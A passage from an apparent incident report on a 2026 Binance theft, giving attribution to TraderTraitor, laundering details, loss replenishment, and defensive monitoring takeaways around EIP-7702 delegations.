- Attribution: TRM Labs, Chainalysis and ZachXBT attribute it to TraderTraitor. Proceeds commingled after THORChain swaps at Ethereum address 0x15104a9ce0f08a8f0075a0869ae80e795fe0feb7 with funds from the September 2026 Bitget theft. The laundering pattern matches Bybit in February 2025. Binance said on Oct 27 it had intercepted Contagious Interview lures aimed at engineers, but has not conclusively tied the compromised laptop to them. The report finds no evidence of autonomous AI use by the attacker.
- Impact: Binance says it has replenished 90% of losses from corporate treasury, the futures insurance fund and SAFU. Ten core assets are back at 100% backing, and withdrawals were due to resume Nov 1.
Takeaway: Preserve the DevOps laptop image and the signing-service request logs, including which container identity requested each signature. Poll hot-wallet code slots every block for the 0xef0100 prefix, and alert on any Type-4 transaction with multiple authorizations or non-consecutive nonces. The report includes Python sketches for a pre-signature EIP-7702 policy gate and a block sentinel that dispatches pre-signed revocations.
